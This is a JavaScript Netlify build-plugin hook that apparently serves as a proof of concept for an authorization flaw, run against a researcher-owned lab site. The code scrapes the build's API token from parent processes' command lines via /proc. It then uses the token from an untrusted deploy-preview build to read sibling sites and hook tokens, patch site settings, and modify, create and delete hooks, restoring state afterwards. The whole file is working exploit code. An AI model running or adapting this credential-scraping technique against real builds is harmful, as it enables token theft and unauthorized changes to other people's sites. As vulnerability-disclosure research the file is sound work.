// Generated for one bounded run against the explicitly owned fixture.
import { readFileSync } from 'node:fs'

const EXPECTED = {"runId":"site-settings-authz-20261002-4aab48499150af8b","siteId":"43a2f4e4-df31-455e-85bc-21f37fae92cd","siteName":"netlify-untrusted-preview-lab","repository":"Jhounx/netlify-untrusted-preview-lab","reviewId":"1","head":"bot/untrusted-preview-probe-36495196637","siblingSiteId":"a13832a0-b3f7-40cb-a07f-df10e6929241","baselineDescription":"","marker":"netlify-owned-site-settings-4aab48499150af8b","realHookIds":["6abaef477aeb0691c3b3cd64","6abaef4802f52c10b2fb9f65","6abaef48ba7f5a0f88432ade"],"selectedRealHookId":"6abaef477aeb0691c3b3cd64","disposableHookId":"6abfb704a7d71d9954853229","syntheticHookUrl":"https://netlify-untrusted-preview-lab.netlify.app/__netlify_hook_sink_4aab48499150af8b","realHookType":"github_commit_status","disposableHookType":"url","hookCreateEvent":"split_test_activated","hookBaselineEvent":"split_test_deactivated","hookUpdatedEvent":"split_test_modified"}
const SUCCESS = "NETLIFY_UNTRUSTED_SITE_UPDATE_AUTHZ "
const FAILURE = "NETLIFY_UNTRUSTED_SITE_UPDATE_AUTHZ_FAILED "
const API = 'https://api.netlify.com'

const safeFailure = (code, status = null) => ({ code, status })

const procText = (pid, name) => {
  try { return readFileSync(`/proc/${pid}/${name}`, 'utf8') } catch { return '' }
}

const parentPid = (pid) => {
  const match = procText(pid, 'status').match(/^PPid:\s+(\d+)$/m)
  return match ? Number(match[1]) : 0
}

const optionValue = (argv, option) => {
  for (let index = 0; index < argv.length; index += 1) {
    if (argv[index] === option && index + 1 < argv.length) return argv[index + 1]
    if (argv[index].startsWith(`${option}=`)) return argv[index].slice(option.length + 1)
  }
  return ''
}

const recoverToken = () => {
  let pid = process.pid
  for (let depth = 0; depth < 12 && pid > 0; depth += 1) {
    const argv = procText(pid, 'cmdline').split('\0').filter(Boolean)
    const token = optionValue(argv, '--token')
    if (token) {
      return { token, netlifyBuildAncestor: argv.some((item) => /(?:@netlify\/build|netlify-build)/i.test(item)) }
    }
    const next = parentPid(pid)
    if (!next || next === pid) break
    pid = next
  }
  return { token: '', netlifyBuildAncestor: false }
}

const request = async (path, token, options = {}) => {
  const headers = { Accept: 'application/json', ...(options.headers || {}) }
  if (token) headers.Authorization = `Bearer ${token}`
  const response = await fetch(`${API}${path}`, { ...options, headers, redirect: 'manual' })
  let body = null
  try { body = await response.json() } catch { /* status is sufficient */ }
  return { status: response.status, body }
}

const jsonRequest = (path, token, method, body) => request(path, token, {
  method,
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(body),
})

const patchDescription = (siteId, token, description) => jsonRequest(
  `/api/v1/sites/${siteId}`, token, 'PATCH', { description },
)

const hookPayload = (event) => ({
  type: EXPECTED.disposableHookType,
  event,
  data: { url: EXPECTED.syntheticHookUrl },
})

const hookMatches = (item, id, event) => item && item.id === id && item.site_id === EXPECTED.siteId &&
  item.type === EXPECTED.disposableHookType && item.event === event && item.disabled == null &&
  item?.data?.url === EXPECTED.syntheticHookUrl

const summarizeHooks = (body) => {
  if (!Array.isArray(body)) return { validList: false }
  const realHooks = body.filter((item) => item && item.type === EXPECTED.realHookType)
  const realIds = realHooks.map((item) => item.id).filter((item) => typeof item === 'string').sort()
  const values = realHooks.map((item) => item?.data?.access_token)
  return {
    validList: true,
    hookCount: realHooks.length,
    realIdsMatched: JSON.stringify(realIds) === JSON.stringify(EXPECTED.realHookIds),
    disposablePresent: body.some((item) => hookMatches(item, EXPECTED.disposableHookId, EXPECTED.hookBaselineEvent)),
    tokenNullCount: values.filter((value) => value === null).length,
    tokenStringCount: values.filter((value) => typeof value === 'string').length,
    tokenOtherCount: values.filter((value) => value !== null && typeof value !== 'string').length,
  }
}

export const onPreBuild = async () => {
  let stage = 'initialize'
  let token = ''
  let mutationObserved = false
  let hookMutationObserved = false
  let hookRestoreStatus = null
  let hookRestoreMatched = false
  let createdHookId = ''
  let createdHookObserved = false
  let createdHookDeleteStatus = null
  let createdHookDeleted = false
  let failure = null
  let proof = null
  let restoreStatus = null
  let restoreMatched = false

  try {
    stage = 'context-binding'
    if (process.env.NETLIFY !== 'true' || process.env.CONTEXT !== 'deploy-preview') throw safeFailure('HOSTED_CONTEXT')
    if (process.env.SITE_ID !== EXPECTED.siteId) throw safeFailure('SITE_ID')
    if (process.env.REVIEW_ID !== EXPECTED.reviewId) throw safeFailure('REVIEW_ID')
    if (process.env.HEAD !== EXPECTED.head) throw safeFailure('HEAD')
    if (!/^[0-9a-f]{40}$/.test(process.env.COMMIT_REF || '')) throw safeFailure('COMMIT_REF')
    if (process.env.NETLIFY_API_TOKEN) throw safeFailure('CHILD_TOKEN_PRESENT')

    stage = 'token-recovery'
    const recovered = recoverToken()
    token = recovered.token
    if (!token || !recovered.netlifyBuildAncestor) throw safeFailure('BUILD_TOKEN_NOT_RECOVERED')

    stage = 'site-read'
    const site = await request(`/api/v1/sites/${EXPECTED.siteId}`, token)
    if (site.status !== 200 || site.body?.id !== EXPECTED.siteId || site.body?.name !== EXPECTED.siteName ||
        site.body?.build_settings?.repo_path !== EXPECTED.repository ||
        site.body?.build_settings?.public_repo !== true ||
        site.body?.build_settings?.untrusted_flow !== 'redact' ||
        site.body?.description !== EXPECTED.baselineDescription) throw safeFailure('SITE_BINDING', site.status)

    stage = 'deploy-read'
    const deployId = process.env.DEPLOY_ID || ''
    if (!/^[0-9a-f]{24}$/.test(deployId)) throw safeFailure('DEPLOY_ID')
    const deploy = await request(`/api/v1/deploys/${deployId}`, token)
    if (deploy.status !== 200 || deploy.body?.id !== deployId || deploy.body?.site_id !== EXPECTED.siteId ||
        deploy.body?.context !== 'deploy-preview' || String(deploy.body?.review_id) !== EXPECTED.reviewId ||
        deploy.body?.commit_ref !== process.env.COMMIT_REF) throw safeFailure('DEPLOY_BINDING', deploy.status)

    stage = 'hook-read-controls'
    const sibling = await request(`/api/v1/sites/${EXPECTED.siblingSiteId}`, token)
    const hooks = await request(`/api/v1/hooks?site_id=${EXPECTED.siteId}`, token)
    const hookSummary = summarizeHooks(hooks.body)
    const selectedRealHook = await request(`/api/v1/hooks/${EXPECTED.selectedRealHookId}`, token)
    const selectedRealHookToken = selectedRealHook.body?.data?.access_token
    const disposableHook = await request(`/api/v1/hooks/${EXPECTED.disposableHookId}`, token)
    const disposableHookUrlMatched = disposableHook.body?.data?.url === EXPECTED.syntheticHookUrl
    const siblingHooks = await request(`/api/v1/hooks?site_id=${EXPECTED.siblingSiteId}`, token)

    stage = 'site-write-control'
    const unauthenticated = await patchDescription(EXPECTED.siteId, '', EXPECTED.marker)
    if (![401, 403, 404].includes(unauthenticated.status)) throw safeFailure('UNAUTHENTICATED_CONTROL', unauthenticated.status)
    const write = await patchDescription(EXPECTED.siteId, token, EXPECTED.marker)
    const readback = await request(`/api/v1/sites/${EXPECTED.siteId}`, token)
    mutationObserved = readback.status === 200 && readback.body?.description === EXPECTED.marker
    const baselineStillPresent = readback.status === 200 && readback.body?.description === EXPECTED.baselineDescription
    if (!mutationObserved && !baselineStillPresent) throw safeFailure('WRITE_STATE_AMBIGUOUS', readback.status)
    if (!mutationObserved && ![401, 403, 404].includes(write.status)) throw safeFailure('WRITE_STATUS_AMBIGUOUS', write.status)

    stage = 'hook-update'
    const hookUpdate = await jsonRequest(
      `/api/v1/hooks/${EXPECTED.disposableHookId}`, token, 'PUT', hookPayload(EXPECTED.hookUpdatedEvent),
    )
    const hookUpdateReadback = await request(`/api/v1/hooks/${EXPECTED.disposableHookId}`, token)
    hookMutationObserved = hookMatches(hookUpdateReadback.body, EXPECTED.disposableHookId, EXPECTED.hookUpdatedEvent)
    const hookBaselineStillPresent = hookMatches(
      hookUpdateReadback.body, EXPECTED.disposableHookId, EXPECTED.hookBaselineEvent,
    )
    if (!hookMutationObserved && !hookBaselineStillPresent) throw safeFailure('HOOK_UPDATE_STATE_AMBIGUOUS', hookUpdateReadback.status)
    if (!hookMutationObserved && ![401, 403, 404].includes(hookUpdate.status)) throw safeFailure('HOOK_UPDATE_STATUS_AMBIGUOUS', hookUpdate.status)
    if (hookMutationObserved) {
      stage = 'hook-update-restore'
      const restored = await jsonRequest(
        `/api/v1/hooks/${EXPECTED.disposableHookId}`, token, 'PUT', hookPayload(EXPECTED.hookBaselineEvent),
      )
      hookRestoreStatus = restored.status
      const restoredReadback = await request(`/api/v1/hooks/${EXPECTED.disposableHookId}`, token)
      hookRestoreMatched = hookMatches(restoredReadback.body, EXPECTED.disposableHookId, EXPECTED.hookBaselineEvent)
      if (!hookRestoreMatched) throw safeFailure('HOOK_UPDATE_RESTORE', hookRestoreStatus)
    } else {
      hookRestoreMatched = true
    }

    stage = 'hook-create'
    const hookCreate = await jsonRequest(
      `/api/v1/hooks?site_id=${EXPECTED.siteId}`, token, 'POST', hookPayload(EXPECTED.hookCreateEvent),
    )
    if (hookCreate.status === 201) {
      stage = 'hook-create-readback'
      createdHookId = typeof hookCreate.body?.id === 'string' ? hookCreate.body.id : ''
      if (!/^[0-9a-f]{24}$/.test(createdHookId)) throw safeFailure('HOOK_CREATE_ID', hookCreate.status)
      const createdReadback = await request(`/api/v1/hooks/${createdHookId}`, token)
      createdHookObserved = createdReadback.status === 200 && hookMatches(
        createdReadback.body, createdHookId, EXPECTED.hookCreateEvent,
      )
      if (!createdHookObserved) throw safeFailure('HOOK_CREATE_READBACK', createdReadback.status)
      stage = 'hook-create-delete'
      const deleted = await request(`/api/v1/hooks/${createdHookId}`, token, { method: 'DELETE' })
      createdHookDeleteStatus = deleted.status
      const deletedReadback = await request(`/api/v1/hooks/${createdHookId}`, token)
      createdHookDeleted = deleted.status === 204 && deletedReadback.status === 404
      const createdStillPresent = deletedReadback.status === 200 && hookMatches(
        deletedReadback.body, createdHookId, EXPECTED.hookCreateEvent,
      )
      if (!createdHookDeleted && !([401, 403, 404].includes(deleted.status) && createdStillPresent)) {
        throw safeFailure('HOOK_CREATE_DELETE_STATE_AMBIGUOUS', deleted.status)
      }
    } else if (![401, 403, 404].includes(hookCreate.status)) {
      throw safeFailure('HOOK_CREATE_STATUS_AMBIGUOUS', hookCreate.status)
    }

    stage = 'hook-owner-disposable-delete'
    const disposableDelete = await request(`/api/v1/hooks/${EXPECTED.disposableHookId}`, token, { method: 'DELETE' })
    const disposableDeleteReadback = await request(`/api/v1/hooks/${EXPECTED.disposableHookId}`, token)
    const disposableDeleteAuthorized = disposableDelete.status === 204 && disposableDeleteReadback.status === 404
    const disposableBaselineStillPresent = disposableDeleteReadback.status === 200 && hookMatches(
      disposableDeleteReadback.body, EXPECTED.disposableHookId, EXPECTED.hookBaselineEvent,
    )
    if (!disposableDeleteAuthorized && !([401, 403, 404].includes(disposableDelete.status) && disposableBaselineStillPresent)) {
      throw safeFailure('HOOK_DELETE_STATE_AMBIGUOUS', disposableDelete.status)
    }

    stage = 'proof-assembly'
    proof = {
      proofSucceeded: true,
      siteBound: true,
      deployBound: true,
      untrustedRedactPolicy: true,
      tokenAbsentFromChildEnvironment: true,
      tokenRecoveredFromNetlifyBuildAncestor: true,
      unauthenticatedControlDenied: true,
      sameSiteWriteStatus: write.status,
      writeResponseMatched: write.body?.description === EXPECTED.marker,
      sameSiteReadbackStatus: readback.status,
      sameSiteReadbackMatched: mutationObserved,
      baselineStillPresentAfterAttempt: baselineStillPresent,
      sameSiteWriteAuthorized: mutationObserved,
      siblingReadStatus: sibling.status,
      siblingReadable: sibling.status === 200,
      hookListStatus: hooks.status,
      hookListValid: hookSummary.validList === true,
      githubStatusHookCount: hookSummary.hookCount ?? 0,
      realHookIdsMatched: hookSummary.realIdsMatched === true,
      disposableHookPresent: hookSummary.disposablePresent === true,
      hookAccessTokenNullCount: hookSummary.tokenNullCount ?? 0,
      hookAccessTokenStringCount: hookSummary.tokenStringCount ?? 0,
      hookAccessTokenOtherCount: hookSummary.tokenOtherCount ?? 0,
      selectedRealHookStatus: selectedRealHook.status,
      selectedRealHookAccessTokenNull: selectedRealHookToken === null,
      selectedRealHookAccessTokenString: typeof selectedRealHookToken === 'string',
      disposableHookStatus: disposableHook.status,
      disposableHookUrlMatched,
      siblingHookListStatus: siblingHooks.status,
      hookUpdateStatus: hookUpdate.status,
      hookUpdateReadbackStatus: hookUpdateReadback.status,
      hookUpdateAuthorized: hookMutationObserved,
      hookUpdateReadbackMatched: hookMutationObserved,
      hookBaselineStillPresentAfterAttempt: hookBaselineStillPresent,
      hookRestoreStatus,
      hookRestoreMatched,
      hookCreateStatus: hookCreate.status,
      hookCreateAuthorized: createdHookObserved,
      hookCreateReadbackMatched: createdHookObserved,
      createdHookId: createdHookId || null,
      createdHookDeleteStatus,
      createdHookDeleted,
      disposableHookDeleteStatus: disposableDelete.status,
      disposableHookDeleteReadbackStatus: disposableDeleteReadback.status,
      disposableHookDeleteAuthorized,
      disposableHookBaselineStillPresentAfterAttempt: disposableBaselineStillPresent,
      rawCredentialsLogged: false,
      rawSiteValuesLogged: false,
    }
  } catch (error) {
    failure = { ...(error && typeof error.code === 'string' ? error : safeFailure('UNKNOWN')), stage }
  } finally {
    if (hookMutationObserved && !hookRestoreMatched && token) {
      try {
        const restored = await jsonRequest(
          `/api/v1/hooks/${EXPECTED.disposableHookId}`, token, 'PUT', hookPayload(EXPECTED.hookBaselineEvent),
        )
        hookRestoreStatus = restored.status
        const readback = await request(`/api/v1/hooks/${EXPECTED.disposableHookId}`, token)
        hookRestoreMatched = hookMatches(readback.body, EXPECTED.disposableHookId, EXPECTED.hookBaselineEvent)
      } catch { hookRestoreMatched = false }
      if (!hookRestoreMatched) failure = safeFailure('HOOK_UPDATE_RESTORE', hookRestoreStatus)
    } else if (!hookMutationObserved) {
      hookRestoreMatched = true
    }
    if (createdHookObserved && !createdHookDeleted && token) {
      try {
        const deleted = await request(`/api/v1/hooks/${createdHookId}`, token, { method: 'DELETE' })
        createdHookDeleteStatus = deleted.status
        const readback = await request(`/api/v1/hooks/${createdHookId}`, token)
        createdHookDeleted = deleted.status === 204 && readback.status === 404
      } catch { createdHookDeleted = false }
    }
    if (mutationObserved && token) {
      try {
        const restored = await patchDescription(EXPECTED.siteId, token, EXPECTED.baselineDescription)
        restoreStatus = restored.status
        const readback = await request(`/api/v1/sites/${EXPECTED.siteId}`, token)
        restoreMatched = readback.status === 200 && readback.body?.description === EXPECTED.baselineDescription
      } catch { restoreMatched = false }
      if (!restoreMatched) failure = safeFailure('RESTORE', restoreStatus)
    } else {
      restoreMatched = true
    }
  }

  if (failure || !proof) {
    console.error(FAILURE + JSON.stringify({
      code: failure?.code || 'UNKNOWN', status: failure?.status ?? null, restoreMatched,
      hookRestoreMatched, createdHookDeleted, stage: failure?.stage || stage,
    }))
    return
  }
  console.log(SUCCESS + JSON.stringify({
    ...proof, restoreStatus, restoreMatched, hookRestoreStatus, hookRestoreMatched,
    createdHookDeleteStatus, createdHookDeleted,
  }))
}
